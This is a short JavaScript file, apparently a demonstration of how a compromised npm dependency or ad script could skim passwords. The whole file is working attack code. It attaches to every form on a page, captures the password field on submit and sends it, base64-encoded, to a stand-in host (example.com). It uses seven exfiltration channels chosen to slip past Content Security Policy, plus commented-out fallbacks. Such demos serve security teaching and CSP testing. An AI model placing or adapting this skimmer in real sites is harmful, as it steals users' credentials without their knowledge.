// I can has ur pass

// Imagine you build an app and this bit, although a little more obfuscated,
//  gets mixed up in one of your npm dependencies.
//  Or an analytics/ads provider decides to serve this / gets hacked.

Array.from(document.querySelectorAll('form'))
    .map(form => {
        console.log('evil script attached', form)
        form.addEventListener('submit', event => {
            event.preventDefault()
            console.log('evil script sending')
            const passwordField = form.querySelector('input[type=password]')
            const payload = btoa(passwordField.value)
            senders.map(sender => sender(payload))
            return false
        })
    })

const senders = [
    payload => fetch(`https://example.com/?n=fetch&q=${payload}`),
    payload => {
        const i = document.createElement('img')
        i.setAttribute('src', `https://example.com/?n=img&q=${payload}`)
        document.body.appendChild(i)
    },
    payload => {
        const i = document.createElement('script')
        i.setAttribute('src', `https://example.com/?n=script&q=${payload}`)
        document.body.appendChild(i)
    },
    payload => {
        const css = `@font-face {
            font-family: myFontNotEvilAtAll;
            src: url(https://example.com/?n=fontface&q=${payload});
        }
        body {
          font-family: 'myFontNotEvilAtAll', sans-serif;
        }`
        const style = document.createElement('style');

        style.type = 'text/css';
        style.innerHTML = css;

        document.head.appendChild(style);
    },
    payload => {
        const l = document.createElement('link')
        l.rel = 'stylesheet'
        l.href = `https://example.com/?n=link&q=${payload}`
        document.head.appendChild(l)
    },
    payload => {
        const l = document.createElement('link')
        l.rel = 'prefetch'
        l.href = `https://example.com/?n=linkpre&q=${payload}`
        document.head.appendChild(l)
    },
    payload => new EventSource(`https://example.com/?n=event&q=${payload}`),
    // If you blocked everything, including form action, try this one to lighten up your mood
    // payload => window.open(`https://example.com/?q=${payload}`)
]

// Uncomment this when you fix senders
// in case all senders don't work
// Array.from(document.querySelectorAll('form'))
//     .map(form => {
//         form.action = `https://example.com/`
//     })
